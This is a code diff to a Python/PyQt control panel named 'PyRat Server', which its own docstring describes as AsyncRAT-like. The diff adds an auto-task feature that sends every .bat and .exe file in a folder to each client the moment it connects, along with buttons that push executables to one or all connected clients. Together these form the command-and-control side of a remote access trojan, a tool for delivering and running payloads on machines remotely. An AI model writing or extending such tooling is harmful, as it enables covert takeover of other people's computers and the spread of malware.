+                f"The task '{task_name}' has been added."
+            )
+        except Exception as e:
+            logger.error(f"Error adding new task: {e}")
+            QMessageBox.critical(
+                self,
+                "Error",
+                f"Failed to add task: {e}"
+            )
+
+    def remove_selected_task(self):
+        """Remove the selected task"""
+        try:
+            selected_rows = self.tasks_table.selectionModel().selectedRows()
+            if not selected_rows:
+                QMessageBox.warning(
+                    self,
+                    "No Task Selected",
+                    "Please select a task to remove."
+                )
+                return
+                
+            row = selected_rows[0].row()
+            task_name = self.tasks_table.item(row, 0).text()
+            
+            reply = QMessageBox.question(
+                self,
+                "Remove Task",
+                f"Are you sure you want to remove the task '{task_name}'?",
+                QMessageBox.Yes | QMessageBox.No,
+                QMessageBox.No
+            )
+            
+            if reply == QMessageBox.Yes:
+                # Remove the task from the dictionary
+                with self.auto_tasks_lock:
+                    if task_name in self.auto_tasks:
+                        del self.auto_tasks[task_name]
+                
+                # Remove from table
+                self.tasks_table.removeRow(row)
+                
+                QMessageBox.information(
+                    self,
+                    "Task Removed",
+                    f"The task '{task_name}' has been removed."
+                )
+        except Exception as e:
+            logger.error(f"Error removing task: {e}")
+            QMessageBox.critical(
+                self,
+                "Error",
+                f"Failed to remove task: {e}"
+            )
+
+    def execute_selected_task(self):
+        """Execute the selected task on all connected clients or client selection"""
+        try:
+            # Check if task selected
+            selected_task_rows = self.tasks_table.selectionModel().selectedRows()
+            if not selected_task_rows:
+                QMessageBox.warning(
+                    self,
+                    "No Task Selected",
+                    "Please select a task to execute."
+                )
+                return
+                
+            task_row = selected_task_rows[0].row()
+            task_name = self.tasks_table.item(task_row, 0).text()
+            
+            # Find the task in dictionary
+            with self.auto_tasks_lock:
+                if task_name not in self.auto_tasks:
+                    QMessageBox.warning(
+                        self,
+                        "Task Not Found",
+                        f"Could not find task '{task_name}' in the task list."
+                    )
+                    return
+                task = self.auto_tasks[task_name]
+                    
+            # Check if file exists
+            if not os.path.exists(task.file_path):
+                QMessageBox.warning(
+                    self,
+                    "File Not Found",
+                    f"The file associated with task '{task_name}' could not be found."
+                )
+                return
+                
+            # Check if any client is selected
+            selected_client_rows = self.client_table.selectionModel().selectedRows()
+            
+            # If client selected, send the file to that client
+            if selected_client_rows:
+                success_count = 0
+                for client_row in selected_client_rows:
+                    row = client_row.row()
+                    addr = (self.client_table.item(row, 0).text(),
+                           int(self.client_table.item(row, 1).text()))
+                    
+                    # Try to send file
+                    self.server_thread.send_file_to_client(task.file_path, addr)
+                    success_count += 1
+                    
+                    # Update task status
+                    self.tasks_table.setItem(task_row, 3, QTableWidgetItem("Executing"))
+                    
+                QMessageBox.information(
+                    self,
+                    "Task Execution",
+                    f"Task '{task_name}' executed on {success_count} client(s)."
+                )
+            else:
+                # Ask if should execute on all clients
+                reply = QMessageBox.question(
+                    self,
+                    "Execute on All Clients",
+                    "No client is selected. Do you want to execute the task on all connected clients?",
+                    QMessageBox.Yes | QMessageBox.No,
+                    QMessageBox.No
+                )
+                
+                if reply == QMessageBox.Yes:
+                    # Get all connected clients
+                    clients = self.server_thread.client_manager.get_all_clients()
+                    if not clients:
+                        QMessageBox.warning(
+                            self,
+                            "No Clients Connected",
+                            "There are no clients connected to execute the task on."
+                        )
+                        return
+                        
+                    # Send file to all clients
+                    self.server_thread.send_file_to_client(task.file_path)
+                    
+                    # Update task status
+                    self.tasks_table.setItem(task_row, 3, QTableWidgetItem("Executing"))
+                    
+                    QMessageBox.information(
+                        self,
+                        "Task Execution",
+                        f"Task '{task_name}' executed on all connected clients."
+                    )
+                    
+            # Update task's last run time
+            with self.auto_tasks_lock:
+                if task_name in self.auto_tasks:
+                    self.auto_tasks[task_name].last_run = datetime.now()
+        except Exception as e:
+            logger.error(f"Error executing task: {e}")
+            QMessageBox.critical(
+                self,
+                "Error",
+                f"Failed to execute task: {e}"
+            )
+
+    def check_auto_execute_tasks(self, addr: tuple):
+        """Check and execute auto tasks that should run when a client connects"""
+        logger.info(f"DEBUG: check_auto_execute_tasks called for {addr}")
+        try:
+            # Verify client has a session key before attempting to execute tasks
+            client = self.server_thread.client_manager.get_client(addr)
+            if not client:
+                logger.info(f"DEBUG: Client {addr} not found, cannot execute tasks")
+                return
+                
+            if not hasattr(client, 'session_key') or not client.session_key:
+                logger.info(f"DEBUG: Client {addr} not ready for tasks yet, session key not established. Retrying in 5 seconds.")
+                # Schedule retry after 5 seconds
+                QTimer.singleShot(5000, lambda: self.check_auto_execute_tasks(addr))
+                return
+
+            # Check for available files in autotasks folder
+            if not os.path.exists(self.auto_tasks_dir):
+                logger.info(f"DEBUG: No autotasks directory found")
+                return
+                
+            # Get all .bat and .exe files in autotasks folder
+            task_files = [f for f in os.listdir(self.auto_tasks_dir) 
+                         if os.path.isfile(os.path.join(self.auto_tasks_dir, f)) and 
+                         (f.endswith('.bat') or f.endswith('.exe'))]
+            
+            if not task_files:
+                logger.info(f"DEBUG: No task files found in autotasks directory")
+                return
+                
+            logger.info(f"DEBUG: Found {len(task_files)} task files to execute")
+            
+            # Execute each file
+            for file_name in task_files:
+                file_path = os.path.join(self.auto_tasks_dir, file_name)
+                if os.path.exists(file_path):
+                    logger.info(f"Auto-executing file '{file_name}' on newly connected client {addr}")
+                    self.append_log(f"Auto-executing file '{file_name}' on {addr}", LogType.FILE_TRANSFER)
+                    
+                    # Use a separate thread to avoid blocking GUI
+                    execute_thread = threading.Thread(
+                        target=self.execute_file_task_async,
+                        args=(file_path, addr)
+                    )
+                    execute_thread.daemon = True
+                    execute_thread.start()
+                    
+                    # Short delay between tasks to prevent overwhelming the client
+                    time.sleep(0.5)
+                    
+        except Exception as e:
+            logger.error(f"Error checking auto tasks: {e}")
+            
+    def execute_file_task_async(self, file_path: str, addr: tuple):
+        """Helper method to execute file task in a separate thread"""
+        try:
+            logger.info(f"Sending file {file_path} to {addr}")
+            # Use proper file sending method with retries
+            success = self.server_thread.send_file_to_client(file_path, addr, 0, 3)
+            if success:
+                logger.info(f"Successfully queued file {os.path.basename(file_path)} for {addr}")
+            else:
+                logger.error(f"Failed to queue file {os.path.basename(file_path)} for {addr}")
+        except Exception as e:
+            logger.error(f"Error executing file task: {e}")
+
     def __init__(self):
         super().__init__()
         self.gui_lock = threading.Lock()
         self.setWindowTitle("PyRat Server")
         self.setGeometry(100, 100, 1400, 900)
         self.setFont(QFont("Segoe UI", 9))
+        
+        # Initialize auto tasks directory and list
+        self.auto_tasks_dir = "autotasks"
+        self.auto_tasks = {}  # Dictionary of task name to task object
+        if not os.path.exists(self.auto_tasks_dir):
+            os.makedirs(self.auto_tasks_dir)
+        
+        # Setup file watcher for auto tasks directory
+        self.file_watcher = QFileSystemWatcher()
+        self.file_watcher.addPath(os.path.abspath(self.auto_tasks_dir))
+        self.file_watcher.directoryChanged.connect(self.refresh_auto_tasks_files)
 
         # Apply global dark theme stylesheet
         self.setStyleSheet("""
@@ -966,10 +1448,10 @@ class ServerGUI(QMainWindow):
         # Set window icon
         self.setWindowIcon(self.style().standardIcon(QStyle.SP_ComputerIcon))
         
-        # Start GUI update timer with higher priority
+        # Start GUI update timer with higher priority but less frequent updates
         self.update_timer = QTimer()
         self.update_timer.timeout.connect(self.process_pending_updates)
-        self.update_timer.start(50)  # Update every 50ms for better responsiveness
+        self.update_timer.start(250)  # Update every 250ms instead of 50ms for better performance
         
         # Set process priority
         if sys.platform == 'win32':
@@ -980,6 +1462,10 @@ class ServerGUI(QMainWindow):
                 win32process.SetPriorityClass(handle, win32process.HIGH_PRIORITY_CLASS)
             except:
                 pass
+
+        # Initialize automation tasks
+        self.auto_tasks_lock = threading.Lock()
+        self.auto_tasks = {}  # Dictionary of task name to task object
 
     def init_gui(self):
         """Initialize the GUI components with a dark, AsyncRAT-like theme"""
@@ -994,6 +1480,40 @@ class ServerGUI(QMainWindow):
         main_layout.setSpacing(0)
         main_layout.setContentsMargins(0, 0, 0, 0)
 
+        # Create tabs
+        self.tabs = QTabWidget()
+        self.tabs.setDocumentMode(True)
+        self.tabs.setStyleSheet("""
+            QTabWidget::pane {
+                border: 1px solid #3A3A3A;
+                background-color: #2E2E2E;
+                top: -1px;
+            }
+            QTabBar::tab {
+                background-color: #252525;
+                color: #AAAAAA;
+                padding: 8px 16px;
+                border: 1px solid #3A3A3A;
+                border-bottom: none;
+                border-top-left-radius: 4px;
+                border-top-right-radius: 4px;
+            }
+            QTabBar::tab:selected {
+                background-color: #3A3A3A;
+                color: #FFFFFF;
+                border-bottom: 1px solid #007ACC;
+            }
+            QTabBar::tab:hover:!selected {
+                background-color: #2A2A2A;
+            }
+        """)
+
+        # --- Main Tab: Clients & Logs ---
+        main_tab = QWidget()
+        main_tab_layout = QVBoxLayout(main_tab)
+        main_tab_layout.setSpacing(0)
+        main_tab_layout.setContentsMargins(0, 0, 0, 0)
+        
         # --- Main Content Area (Splitter) ---
         splitter = QSplitter(Qt.Vertical)
         splitter.setStyleSheet("QSplitter::handle { background-color: #3A3A3A; }")
@@ -1003,6 +1523,10 @@ class ServerGUI(QMainWindow):
         client_section_widget = QWidget()
         client_layout = QVBoxLayout(client_section_widget)
         client_layout.setContentsMargins(5, 5, 5, 5)
+        client_header = QLabel("Connected Clients")
+        client_header.setStyleSheet("font-weight: bold; font-size: 14px; color: #E0E0E0; padding-bottom: 5px;")
+        client_layout.addWidget(client_header)
+        
         self.client_table = QTableWidget()
         self.client_table.setColumnCount(6)
         self.client_table.setHorizontalHeaderLabels([
@@ -1023,6 +1547,10 @@ class ServerGUI(QMainWindow):
         log_section_widget = QWidget()
         log_layout = QVBoxLayout(log_section_widget)
         log_layout.setContentsMargins(5, 5, 5, 5)
+        log_header = QLabel("Server Logs")
+        log_header.setStyleSheet("font-weight: bold; font-size: 14px; color: #E0E0E0; padding-bottom: 5px;")
+        log_layout.addWidget(log_header)
+        
         self.log_table = QTableWidget()
         self.log_table.setColumnCount(4)
         self.log_table.setHorizontalHeaderLabels([
@@ -1040,8 +1568,203 @@ class ServerGUI(QMainWindow):
         log_layout.addWidget(self.log_table)
         splitter.addWidget(log_section_widget)
 
-        main_layout.addWidget(splitter)
+        main_tab_layout.addWidget(splitter)
         splitter.setSizes([int(self.height() * 0.6), int(self.height() * 0.4)]) # Initial sizing
+        
+        # --- Auto Tasks Tab ---
+        auto_tasks_tab = QWidget()
+        auto_tasks_layout = QVBoxLayout(auto_tasks_tab)
+        auto_tasks_layout.setContentsMargins(10, 10, 10, 10)
+        
+        # Split the auto tasks tab into two sections
+        auto_tasks_splitter = QSplitter(Qt.Horizontal)
+        auto_tasks_splitter.setStyleSheet("QSplitter::handle { background-color: #3A3A3A; }")
+        auto_tasks_splitter.setHandleWidth(2)
+        
+        # Left side: Tasks list and controls
+        tasks_widget = QWidget()
+        tasks_layout = QVBoxLayout(tasks_widget)
+        tasks_layout.setContentsMargins(0, 0, 0, 0)
+        
+        tasks_header = QLabel("Auto Tasks")
+        tasks_header.setStyleSheet("font-weight: bold; font-size: 14px; color: #E0E0E0; padding-bottom: 5px;")
+        tasks_layout.addWidget(tasks_header)
+        
+        # Tasks table
+        self.tasks_table = QTableWidget()
+        self.tasks_table.setColumnCount(4)
+        self.tasks_table.setHorizontalHeaderLabels([
+            "Task Name", "Type", "Execute On", "Status"
+        ])
+        self.tasks_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
+        self.tasks_table.setSelectionBehavior(QTableWidget.SelectRows)
+        self.tasks_table.setEditTriggers(QTableWidget.NoEditTriggers)
+        self.tasks_table.setShowGrid(True)
+        self.tasks_table.setAlternatingRowColors(True)
+        self.tasks_table.setStyleSheet(
+            "QTableWidget { alternate-background-color: #2A2A2A; }"
+        )
+        tasks_layout.addWidget(self.tasks_table)
+        
+        # Task controls
+        task_controls = QHBoxLayout()
+        
+        add_task_btn = QPushButton("Add Task")
+        add_task_btn.setIcon(self.style().standardIcon(QStyle.SP_FileDialogNewFolder))
+        add_task_btn.setStyleSheet("""
+            QPushButton {
+                background-color: #007ACC;
+                color: white;
+                border: 1px solid #005C9E;
+                padding: 8px 16px;
+                border-radius: 3px;
+                font-weight: bold;
+                font-size: 11pt;
+                min-width: 120px;
+            }
+            QPushButton:hover {
+                background-color: #0088DD;
+            }
+            QPushButton:pressed {
+                background-color: #005C9E;
+            }
+        """)
+        add_task_btn.clicked.connect(self.add_new_task)
+        
+        remove_task_btn = QPushButton("Remove Task")
+        remove_task_btn.setIcon(self.style().standardIcon(QStyle.SP_TrashIcon))
+        remove_task_btn.setStyleSheet("""
+            QPushButton {
+                background-color: #E74C3C;
+                color: white;
+                border: 1px solid #C0392B;
+                padding: 8px 16px;
+                border-radius: 3px;
+                font-weight: bold;
+                font-size: 11pt;
+                min-width: 120px;
+            }
+            QPushButton:hover {
+                background-color: #F5543F;
+            }
+            QPushButton:pressed {
+                background-color: #C0392B;
+            }
+        """)
+        remove_task_btn.clicked.connect(self.remove_selected_task)
+        
+        execute_task_btn = QPushButton("Execute Now")
+        execute_task_btn.setIcon(self.style().standardIcon(QStyle.SP_MediaPlay))
+        execute_task_btn.setStyleSheet("""
+            QPushButton {
+                background-color: #2ECC71;
+                color: white;
+                border: 1px solid #27AE60;
+                padding: 8px 16px;
+                border-radius: 3px;
+                font-weight: bold;
+                font-size: 11pt;
+                min-width: 120px;
+            }
+            QPushButton:hover {
+                background-color: #4DDD87;
+            }
+            QPushButton:pressed {
+                background-color: #27AE60;
+            }
+        """)
+        execute_task_btn.clicked.connect(self.execute_selected_task)
+        
+        task_controls.addWidget(add_task_btn)
+        task_controls.addWidget(remove_task_btn)
+        task_controls.addWidget(execute_task_btn)
+        
+        tasks_layout.addLayout(task_controls)
+        auto_tasks_splitter.addWidget(tasks_widget)
+        
+        # Right side: Files and auto-execution settings
+        files_widget = QWidget()
+        files_layout = QVBoxLayout(files_widget)
+        files_layout.setContentsMargins(0, 0, 0, 0)
+        
+        files_header = QLabel("Auto Task Files")
+        files_header.setStyleSheet("font-weight: bold; font-size: 14px; color: #E0E0E0; padding-bottom: 5px;")
+        files_layout.addWidget(files_header)
+        
+        # Files list
+        self.files_list = QListWidget()
+        self.files_list.setStyleSheet(
+            "QListWidget { background-color: #252525; border: 1px solid #3A3A3A; }"
+            "QListWidget::item { padding: 5px; border-bottom: 1px solid #3A3A3A; }"
+            "QListWidget::item:selected { background-color: #007ACC; color: white; }"
+        )
+        files_layout.addWidget(self.files_list)
+        
+        # File controls
+        file_controls = QHBoxLayout()
+        
+        add_file_btn = QPushButton("Add File")
+        add_file_btn.setIcon(self.style().standardIcon(QStyle.SP_FileDialogNewFolder))
+        add_file_btn.setStyleSheet("""
+            QPushButton {
+                background-color: #3498DB;
+                color: white;
+                border: 1px solid #2980B9;
+                padding: 8px 16px;
+                border-radius: 3px;
+                font-weight: bold;
+                font-size: 11pt;
+                min-width: 120px;
+            }
+            QPushButton:hover {
+                background-color: #41A4EB;
+            }
+            QPushButton:pressed {
+                background-color: #2980B9;
+            }
+        """)
+        add_file_btn.clicked.connect(self.add_task_file)
+        
+        open_folder_btn = QPushButton("Open Folder")
+        open_folder_btn.setIcon(self.style().standardIcon(QStyle.SP_DirOpenIcon))
+        open_folder_btn.setStyleSheet("""
+            QPushButton {
+                background-color: #9B59B6;
+                color: white;
+                border: 1px solid #8E44AD;
+                padding: 8px 16px;
+                border-radius: 3px;
+                font-weight: bold;
+                font-size: 11pt;
+                min-width: 120px;
+            }
+            QPushButton:hover {
+                background-color: #A569BD;
+            }
+            QPushButton:pressed {
+                background-color: #8E44AD;
+            }
+        """)
+        open_folder_btn.clicked.connect(self.open_tasks_folder)
+        
+        file_controls.addWidget(add_file_btn)
+        file_controls.addWidget(open_folder_btn)
+        file_controls.addStretch()
+        
+        files_layout.addLayout(file_controls)
+        auto_tasks_splitter.addWidget(files_widget)
+        
+        auto_tasks_layout.addWidget(auto_tasks_splitter)
+        
+        # Add tabs to the tab widget
+        self.tabs.addTab(main_tab, "Clients & Logs")
+        self.tabs.addTab(auto_tasks_tab, "Auto Tasks")
+        
+        # Add the tab widget to the main layout
+        main_layout.addWidget(self.tabs)
+        
+        # Load existing auto task files
+        self.refresh_auto_tasks_files()
 
         # --- Toolbar ---
         toolbar = QToolBar("Main Toolbar")
@@ -1101,60 +1824,71 @@ class ServerGUI(QMainWindow):
 
     def process_pending_updates(self):
         """Process pending GUI updates in batches"""
-        if not self.pending_updates:
-            return
-            
         try:
-            batch_size = 10
-            processed_count = 0
-            
-            while self.pending_updates and processed_count < batch_size:
-                update_type, data = self.pending_updates.pop(0)
-                processed_count += 1
+            if not self.pending_updates:
+                return
                 
+            # Process updates in batches of 25
+            batch_size = 25
+            updates = self.pending_updates[:batch_size]
+            self.pending_updates = self.pending_updates[batch_size:]
+            
+            # Group updates by type for more efficient processing
+            client_updates = []
+            log_updates = []
+            status_updates = []
+            
+            for update_type, data in updates:
                 if update_type == "add_client":
-                    self._add_client_impl(data)
+                    client_updates.append(data)
                 elif update_type == "remove_client":
-                    self._remove_client_impl(data)
+                    client_updates.append(data)
                 elif update_type == "update_status":
-                    addr_tuple, status_str = data
-                    self._update_client_status_impl(addr_tuple, status_str)
+                    status_updates.append(data)
                 elif update_type == "log":
-                    self._append_log_impl(data)
+                    log_updates.append(data)
             
-            if processed_count > 0:
-                QApplication.processEvents()
+            # Process client updates
+            for addr in client_updates:
+                if addr in self.clients:
+                    self._remove_client_impl(addr)
+                else:
+                    self._add_client_impl(addr)
             
+            # Process status updates
+            for addr, status in status_updates:
+                if addr in self.clients:
+                    self._update_client_status_impl(addr, status)
+            
+            # Process log updates
+            for data in log_updates:
+                self._append_log_impl(data)
+            
+            # Schedule next update if there are more pending
+            if self.pending_updates:
+                QTimer.singleShot(50, self.process_pending_updates)
+                
         except Exception as e:
-            logger.error(f"Critical Error processing GUI updates batch: {e}", exc_info=True)
+            logger.error(f"Error processing pending updates: {e}")
+            # Clear pending updates on error to prevent accumulation
+            self.pending_updates = []
 
     def _add_client_impl(self, addr: tuple):
         """Implementation of adding a client to the table, preventing duplicates."""
         with self.gui_lock:
             try:
-                # Check if client with this address already exists (e.g. rapid reconnect)
-                if addr in self.clients:
-                    # Option 1: Log and ignore if already connecting/connected (prevent visual duplicate)
-                    # logger.warning(f"Client {addr} attempting to re-add while already present. Ignoring add.")
-                    # return
-
-                    # Option 2: If it exists, try to re-use/update its row if it was marked for removal or failed.
-                    # This is more complex as it requires tracking client state more finely.
-                    # For now, let's ensure the old one is robustly removed first.
-                    # If a client is re-added, it means the previous one should have been removed.
-                    # The issue might be the remove signal not being processed before the new add signal.
-                    # The current logic below will add a new row, relying on the remove for the old one.
-                    # We will focus on making remove more robust.
-                    logger.info(f"Client {addr} is being re-added. Previous instance should have been removed.")
-
+                # Ensure autotasks directory exists
+                if not os.path.exists(self.auto_tasks_dir):
+                    os.makedirs(self.auto_tasks_dir)
+                    
+                # Add client to table
                 row = self.client_table.rowCount()
                 self.client_table.insertRow(row)
 
                 ip_item = QTableWidgetItem(addr[0])
                 port_item = QTableWidgetItem(str(addr[1]))
-                # Initial status is now set by the ClientHandler's first update_client_status_signal
-                status_item = QTableWidgetItem("Pending Add...") # Placeholder until first real status update
-                status_item.setForeground(QColor("#E0E0E0"))
+                status_item = QTableWidgetItem("Connecting...")
+                status_item.setForeground(QColor("#FFC107"))  # Yellow for connecting
                 time_item = QTableWidgetItem(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
                 uptime_item = QTableWidgetItem("00:00:00")
 
@@ -1163,23 +1897,60 @@ class ServerGUI(QMainWindow):
 
                 self.client_table.setItem(row, 0, ip_item)
                 self.client_table.setItem(row, 1, port_item)
-                self.client_table.setItem(row, 2, status_item) # Status will be updated by update_client_status
+                self.client_table.setItem(row, 2, status_item)
                 self.client_table.setItem(row, 3, time_item)
                 self.client_table.setItem(row, 4, uptime_item)
 
+                # Create action buttons
                 actions_widget = QWidget()
                 actions_layout = QHBoxLayout(actions_widget)
                 actions_layout.setContentsMargins(2, 2, 2, 2)
                 actions_layout.setSpacing(3)
-                button_style = """QPushButton {{...}} """ # Keep existing button style
+                
                 send_btn = QPushButton("Send")
-                send_btn.setStyleSheet(button_style)
+                send_btn.setStyleSheet("""
+                    QPushButton {
+                        background-color: #007ACC;
+                        color: white;
+                        border: 1px solid #005C9E;
+                        padding: 4px 8px;
+                        border-radius: 2px;
+                        font-weight: bold;
+                        font-size: 10pt;
+                        min-width: 70px;
+                    }
+                    QPushButton:hover {
+                        background-color: #0088DD;
+                    }
+                    QPushButton:pressed {
+                        background-color: #005C9E;
+                    }
+                """)
                 send_btn.setToolTip("Send file to this client")
                 send_btn.clicked.connect(lambda: self.send_file_to_client(addr))
+                
                 disconnect_btn = QPushButton("Kill")
-                disconnect_btn.setStyleSheet(button_style)
+                disconnect_btn.setStyleSheet("""
+                    QPushButton {
+                        background-color: #E74C3C;
+                        color: white;
+                        border: 1px solid #C0392B;
+                        padding: 4px 8px;
+                        border-radius: 2px;
+                        font-weight: bold;
+                        font-size: 10pt;
+                        min-width: 70px;
+                    }
+                    QPushButton:hover {
+                        background-color: #F5543F;
+                    }
+                    QPushButton:pressed {
+                        background-color: #C0392B;
+                    }
+                """)
                 disconnect_btn.setToolTip("Disconnect this client")
                 disconnect_btn.clicked.connect(lambda: self.disconnect_client(addr))
+                
                 actions_layout.addWidget(send_btn)
                 actions_layout.addWidget(disconnect_btn)
                 actions_layout.addStretch()
@@ -1273,7 +2044,7 @@ class ServerGUI(QMainWindow):
         
         timer = self.clients[addr]["uptime_timer"]
         timer.timeout.connect(lambda: self._update_uptime(addr, row))
-        timer.start(1000) # Update every second
+        timer.start(3000) # Update every 3 seconds instead of every second to reduce UI load
 
     def _update_uptime(self, addr: tuple, row: int):
         """Updates the uptime display in the client table."""
@@ -1281,34 +2052,32 @@ class ServerGUI(QMainWindow):
             if addr not in self.clients: # Client might have been removed
                 # The timer for this addr should have been stopped by _remove_client_impl
                 # but as a safeguard, we check here too.
-                # logger.debug(f"_update_uptime: Client {addr} no longer in self.clients. Timer should be stopped.")
                 return
 
             # Ensure row index is still valid for the *current* state of self.clients[addr]
-            # This is important if rows might have shifted due to other removals.
-            # The `row` argument to this function might become stale if not careful.
-            # It's safer to get the current row from self.clients[addr]["row"]
             current_row_for_addr = self.clients[addr]["row"]
 
             if current_row_for_addr >= self.client_table.rowCount():
                 logger.warning(f"_update_uptime: Row {current_row_for_addr} for client {addr} is out of bounds. Stopping timer.")
                 self.clients[addr]["uptime_timer"].stop()
-                # It's possible the client is about to be removed, or was removed without stopping timer correctly.
                 return
 
             connect_time = self.clients[addr]["connect_time"]
             uptime_delta = datetime.now() - connect_time
             uptime_str = str(uptime_delta).split('.')[0] # HH:MM:SS format
             
-            uptime_item = self.client_table.item(current_row_for_addr, 4)
-            if not uptime_item:
-                uptime_item = QTableWidgetItem()
-                self.client_table.setItem(current_row_for_addr, 4, uptime_item)
-            uptime_item.setText(uptime_str)
-            uptime_item.setTextAlignment(Qt.AlignCenter)
+            # Only update the UI if the uptime string has changed
+            current_uptime = self.client_table.item(current_row_for_addr, 4).text() if self.client_table.item(current_row_for_addr, 4) else ""
+            if uptime_str != current_uptime:
+                uptime_item = self.client_table.item(current_row_for_addr, 4)
+                if not uptime_item:
+                    uptime_item = QTableWidgetItem()
+                    self.client_table.setItem(current_row_for_addr, 4, uptime_item)
+                uptime_item.setText(uptime_str)
+                uptime_item.setTextAlignment(Qt.AlignCenter)
 
     def _append_log_impl(self, data: tuple):
-        """Actual implementation of appending log message"""
+        """Actual implementation of appending log message with optimized UI updates"""
         try:
             message, log_type, client = data
             if not hasattr(self, 'log_table') or not self.log_table or not self.log_table.isVisible():
@@ -1318,10 +2087,10 @@ class ServerGUI(QMainWindow):
             timestamp = datetime.now()
             row = self.log_table.rowCount()
             
-            # Limit log table size
-            if row >= 1000:  # Keep last 1000 entries
+            # More aggressive log limitation
+            if row >= 500:  # Keep last 500 entries instead of 1000
                 self.log_table.removeRow(0)
-                row = 999
+                row = 499
             
             # Create all items at once
             items = [
@@ -1344,12 +2113,32 @@ class ServerGUI(QMainWindow):
             for col, item in enumerate(items):
                 self.log_table.setItem(row, col, item)
                 
+            # Don't scroll for every log entry to reduce UI load
+            # Only auto-scroll for errors or if we're at the bottom
+            if (log_type == LogType.ERROR or 
+                self.log_table.verticalScrollBar().value() == self.log_table.verticalScrollBar().maximum()):
+                self.log_table.scrollToBottom()
+                
         except Exception as e:
             logger.error(f"Error appending log: {e}")
             logger.info(f"[{log_type}] {client or 'System'}: {message}")
 
     def append_log(self, message: str, log_type: str = LogType.SYSTEM, client: str = None):
         """Queue log message for batch processing"""
+        # For connection status messages, only log important ones to reduce UI updates
+        if log_type == LogType.CONNECTION and not client:
+            # Skip routine connection updates from the system
+            if "heartbeat" in message.lower() or "checking connection" in message.lower():
+                return
+                
+        # For heartbeat messages, log less frequently
+        if "heartbeat" in message.lower():
+            # Throttling heartbeat logs
+            current_time = getattr(self, 'last_heartbeat_log', 0)
+            if time.time() - current_time < 30:  # Only log heartbeats every 30 seconds
+                return
+            self.last_heartbeat_log = time.time()
+                
         self.pending_updates.append(("log", (message, log_type, client)))
 
     def closeEvent(self, event):
@@ -1396,6 +2185,40 @@ class ServerGUI(QMainWindow):
     def add_client(self, addr: tuple):
         """Queue client addition for batch processing"""
         self.pending_updates.append(("add_client", addr))
+        
+        # Directly log the execution of this method
+        logger.info(f"DEBUG: add_client called for {addr}, scheduling task execution")
+        
+        # Create a standalone method for the delayed execution with progressive retry
+        def execute_tasks(retry_count=0, max_retries=5):
+            logger.info(f"DEBUG: Timer fired for auto tasks, attempt {retry_count+1}/{max_retries+1}")
+            try:
+                # Check if client has a session key before executing tasks
+                client = self.server_thread.client_manager.get_client(addr)
+                if client and hasattr(client, 'session_key') and client.session_key:
+                    logger.info(f"DEBUG: Client {addr} has session key established, executing auto tasks")
+                    self.check_auto_execute_tasks(addr)
+                else:
+                    wait_time = 2.0 * (2 ** min(retry_count, 2))  # Exponential backoff but max 8 seconds
+                    if retry_count < max_retries:
+                        logger.info(f"DEBUG: Client {addr} not ready for tasks yet, retrying in {wait_time}s (attempt {retry_count+1}/{max_retries+1})")
+                        QTimer.singleShot(int(wait_time * 1000), lambda: execute_tasks(retry_count + 1, max_retries))
+                    else:
+                        logger.warning(f"DEBUG: Client {addr} never established a session key after {max_retries+1} attempts")
+            except Exception as e:
+                logger.error(f"Error in execute_tasks: {e}")
+        
+        # Check for auto tasks and create default if needed
+        self.ensure_default_auto_task()
+        
+        # Start the first attempt after a delay to allow key exchange
+        QTimer.singleShot(3000, lambda: execute_tasks())
+        
+    def ensure_default_auto_task(self):
+        """Create autotasks directory if it doesn't exist"""
+        if not os.path.exists(self.auto_tasks_dir):
+            os.makedirs(self.auto_tasks_dir)
+            logger.info("Created autotasks directory")
 
     def remove_client(self, addr: tuple):
         """Queue client removal for batch processing"""
@@ -1457,6 +2280,31 @@ class ServerGUI(QMainWindow):
                 client.conn.close()
         except Exception as e:
             logger.error(f"Error disconnecting client {addr}: {e}")
+
+    def send_file_to_client(self, addr: tuple):
+        """Send a file to a specific client by address"""
+        try:
+            # Check if client exists
+            client = self.server_thread.client_manager.get_client(addr)
+            if not client:
+                QMessageBox.warning(self, "Warning", f"Client {addr} not found or disconnected")
+                return
+                
+            # Open file dialog to select file
+            file_path, _ = QFileDialog.getOpenFileName(
+                self,
+                f"Select File to Send to {addr[0]}:{addr[1]}",
+                "",
+                "Executable Files (*.exe);;Batch Files (*.bat);;All Files (*.*)"
+            )
+            
+            if file_path:
+                # Send the file using the server thread
+                self.server_thread.send_file_to_client(file_path, addr)
+                self.append_log(f"Sending file {os.path.basename(file_path)} to {addr[0]}:{addr[1]}", LogType.FILE_TRANSFER)
+        except Exception as e:
+            logger.error(f"Error sending file to client {addr}: {e}")
+            QMessageBox.critical(self, "Error", f"Failed to send file: {e}")
 
 def validate_environment() -> bool:
     if not os.path.exists('.env'):
